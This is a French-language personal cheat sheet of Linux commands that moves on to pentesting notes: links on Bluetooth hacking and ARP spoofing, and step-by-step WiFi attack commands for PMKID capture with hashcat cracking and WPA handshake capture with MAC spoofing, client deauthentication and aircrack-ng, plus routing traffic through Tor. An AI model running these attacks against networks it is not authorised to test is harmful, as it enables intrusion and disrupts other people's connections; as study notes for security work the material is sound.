<h2>Commandes de base linux :</h2>

Vider le terminal : CTRL + L

Savoir où on est dans l'arborescence : `pwd`

Se déplacer dans un autre dossier : `cd [chemin relatif ou absolu]` 

Retourner dans son home : `cd`

Retourner dans le dossier parent : `cd ..`

Aller à la racine : `cd /..`



Afficher le manuel relatif à une commande : `man [commande]`

Manuel du manuel : `man man`

Lister les commandes qui utilisent un terme : `apropos [terme]`

Localiser un élément : `locate [élément]`

Faire une recherche dans un fichier : `grep [mot] [nom fichier]`


Lister les fichiers/documents dans le dossier actuel : `ls` (argument `-a` pour les fichiers cachés ou `-l` pour plus de détails)
Pour obtenir la taille de chacun des sous-répertoires du répertoire courant : `du`



Créer un fichier : `touch [nom.extension]`

Créer un dossier : `mkdir [nom dossier]`

Supprimer un fichier : `rm [nom fichier]`

Supprimer un dossier : `rm -r [nom dossier]`

Copier un élément : ` cp [nom élément] [chemin/nouveau nom]`

Déplacer un élément : `mv [nom élément] [chemin destination]`

Voir contenu d'un fichier : `cat [nom fichier]`

Ouvrir fichier avec un éditeur de texte : `nano [nom fichier]`

------------------

<h2>Redirection de flux :</h2>

`>` redirige le résultat de la commande dans un fichier et l'écrase s'il existe déjà 

`>>` redirige à la fin d'un fichier et le crée s'il n'existe pas

=> Les erreurs ne sont pas redirigées !!
Pour cela on a d'autres techniques  : 
`2>` ou `2>>` envoie les erreurs dans le fichier désiré

Pour envoyer les erreurs et le résultat dans un même fichier on ajoute `2>&1` après avoir dit où envoyer le résultat.

Pour envoyer des données à utiliser pour une commande, on utilise `<` suivi du nom du fichier.

On peut faire de même mais en indiquant qu'on saisira au clavier les données à utiliser par la commande : `<< [mot clé pour indiquer la fin de la saisie]`
On revient à la ligne après avoir saisi chaque élément et pour arrêter on saisi le mot clé défini au préalable.

« Chaîner des commandes » ? Cela signifie connecter la sortie d'une commande à l'entrée d'une autre commande. Le "pipe" `|` effectue la connexion entre la sortie d'une commande et l'entrée de la suivante. 

Pour lancer un programme et avoir le retour de l'invite de commande dans un fichier texte : `python myscript.py > errorlog.txt 2>&1`

------------------
<h2>Commandes utiles linux :</h2>

Pour unzip un fichier .tar.gz :
`tar -xvf [nom du fichier]`

Réactiver network manager : 
`systemctl restart NetworkManager`

Avoir IP public : 
`curl ifconfig.me`

Vérifier si bluetooth fonctionne : 
`sudo service bluetooth status`

Regarder quel est l'interface bluetooth : 
`hcitool dev`

Activer bluetooth si marche pas : 
```
sudo systemctl enable bluetooth.service` puis `sudo systemctl start bluetooth.service
```

Bug souris VM : ouvrir un terminal, taper `ps -ax | grep VBoxClient` et tuer les processus avec "VBoxClient --draganddrop" dans le titre avec la commande `kill [numéro du processus]`

Activer mode monitoring : 
```
airmon-ng start wlan0`puis `airmon-ng check kill
```


<h2>Recherches sur le pentesting :</h2>

Hack bluetooth : https://www.google.com/amp/s/untelephone.com/guide-pirater-un-portable-par-bluetooth/amp/
- Bluejacking ou bluehacking (possibilité de peu de chose)
- Bluejacking (le plus puissant)
- Bluebugging (obsolète pour la plupart des smartphones récents)
- Blueprinting (processus d'empreinte)
- Bluesmack (attaque DoS)

Crack WPA : https://analyse-innovation-solution.fr/publication/fr/hacking/crack-wifi

DNS et ARP spoofing : https://analyse-innovation-solution.fr/publication/fr/hacking/mitm-arp-spoofing

Crack Wifi PMKID : https://www.cyberark.com/resources/threat-research-blog/cracking-wifi-at-scale-with-one-simple-trick
https://hashcat.net/forum/thread-7717.html


https://miloserdov.org/?p=418

------------------

<h2> Outils de pentest : </h2>


Générateur d’adresse MAC : https://miniwebtool.com/fr/mac-address-generator/


------------------
<h2>Crack PMKID :</h2>


Brancher son antenne wifi et l'associer à la VM puis exécuter la commande suivante pour désactiver les processus qui pourrait déranger durant le scann : 
`sudo airmon-ng check kill`

Commencer le scann de PMKID qui seront stockés dans le fichier "Wi-Fi_PMKID.pcapng" :

```
sudo hcxdumptool -i wlan0 -o Wi-Fi_PMKID.pcapng --disable_deauthentication --disable_client_attacks --enable_status=3
```

Une fois que l'on les réseaux que l'on souhaite, on convertit le fichier en format texte pour hashcat :

```
hcxpcapngtool -o Wi-Fi_pmkid_hash_22000_file.txt Wi-Fi_PMKID.pcapng
```

Transférer le fichier texte sur un PC puissant pour hasher les clés. Utiliser la base de la commande suivante :

- Pour une attaque par masque 

```
sudo hashcat -a 3 -w4 -m 22000 Wi-Fi_pmkid_hash_22000_file.txt [masque utilisé] -o pmkid_cracked.txt
```
- Pour une attaque par dictionnaire 
```
sudo hashcat -a 0 -m 22000 Wi-Fi_pmkid_hash_22000_file.txt -o pmkid_cracked.txt [nom du dictionnaire]
```

Ajouter `-D 1` si on veut utiliser uniquement le CPU 

Les différents masques possibles : 



------------------

<h2>Crack WPA :</h2>



On vérifie d'abord si la carte réseau bien connectée : `iwconfig` ou `ip addr `

On désactive la carte réseau : `sudo ifconfig wlan0 down`

On modifie l'adresse MAC de la carte réseau (2 première paire doit rester la même) :
`sudo macchanger -m XX:XX:XX:XX:XX:XX wlan0`

On réactive la carte : `sudo ifconfig wlan0 up`

On ferme tous les programmes qui utilisent la carte réseau : `sudo airmon-ng check kill`

On passe la carte en mode monitoring : `sudo airmon-ng start wlan0`

On scanne les réseaux disponibles à porté : `sudo airodump-ng wlan0mon`

Noter de côté les infos du routeur visé, exemple : nom de l'AP, son adresse MAC et le channel

On affiche uniquement ce routeur : `sudo airodump-ng wlan0mon -d [router mac adress]`

On capture dans un fichier "info" les 4 way handshakes :
```
sudo airodump-ng -w info -c [number of the channel] --bssid [router mac adress] wlan0mon 
``` 

Dans un nouveau terminal on va désautentifier un client du routeur : 
```
sudo aireplay-ng --deauth 0 -a [router mac adress] wlan0mon
```

On attend d'avoir une WPA handshake. On désactive le mode monitoring : `sudo airmon-ng stop wlan0mon     ` 

On va essayer de cracker le mdp avec un dictionnaire : 
```
sudo aircrack-ng [nom du fichier.cap] -w [chemin vers le dictionnaire]
```

Pour réactiver le wifi : `sudo systemctl start NetworkManager`




------------------
<h2>Comment utiliser tor comme proxy ? </h2>

Activer tor : `service tor start`

Vérifier que tor est bien activé : `service tor status`

Activer tor pour toutes les commandes de la session : `source torsocks on`

Activer tor pour une seule commande : `torsocks [commande]`

Tester adresse ip dans le terminal : `wget -qO - https://api.ipify.org; echo`
